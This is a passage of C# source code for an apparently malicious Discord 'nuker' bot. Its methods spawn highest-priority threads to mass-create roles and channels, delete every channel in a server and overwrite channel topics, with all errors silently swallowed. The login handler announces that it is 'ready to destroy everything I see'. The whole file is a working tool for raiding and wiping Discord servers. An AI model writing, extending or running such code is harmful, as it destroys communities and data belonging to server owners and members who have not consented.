                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void CreateRoles(ulong guildId, int roles, string roleName)
    {
        try
        {
            DiscordGuild guild = client.GetGuild(guildId);

            for (int i = 0; i < roles; i++)
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        guild.CreateRole(new RoleProperties() { Name = roleName });
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void CreateChannels(ulong guildId, int channels, string channelName, ChannelType channelType)
    {
        for (int i = 0; i < channels; i++)
        {
            Thread thread = new Thread(() =>
            {
                try
                {
                    client.CreateGuildChannel(guildId, channelName, channelType);
                }
                catch
                {

                }
            });
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public static void DeleteChannels(ulong guildId, ChannelType channelType)
    {
        try
        {
            foreach (GuildChannel channel in client.GetGuild(guildId).GetChannels())
            {
                if (channel.Type.Equals(channelType))
                {
                    Thread thread = new Thread(() =>
                    {
                        try
                        {
                            client.DeleteChannel(channel.Id);
                        }
                        catch
                        {

                        }
                    });
                    thread.Priority = ThreadPriority.Highest;
                    thread.Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void DeleteChannels(ulong guildId)
    {
        try
        {
            foreach (GuildChannel channel in client.GetGuild(guildId).GetChannels())
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        client.DeleteChannel(channel.Id);
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void SetTopic(ulong guildId, string topic)
    {
        try
        {
            foreach (GuildChannel channel in client.GetGuild(guildId).GetChannels())
            {
                if (channel.Type.Equals(ChannelType.Text))
                {
                    Thread thread = new Thread(() =>
                    {
                        try
                        {
                            ((TextChannel)channel).Modify(new TextChannelProperties() { Topic = topic });
                        }
                        catch
                        {

                        }
                    });
                    thread.Priority = ThreadPriority.Highest;
                    thread.Start();
                }
            }
        }
        catch
        {

        }
    }

    private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
    {
        Console.WriteLine("[!] Succesfully connected to Discord! I am ready to destroy everything I see!");
        client.SetActivity(new ActivityProperties() { Name = "I will destroy everything I see! ", Type = ActivityType.Streaming });
    }
}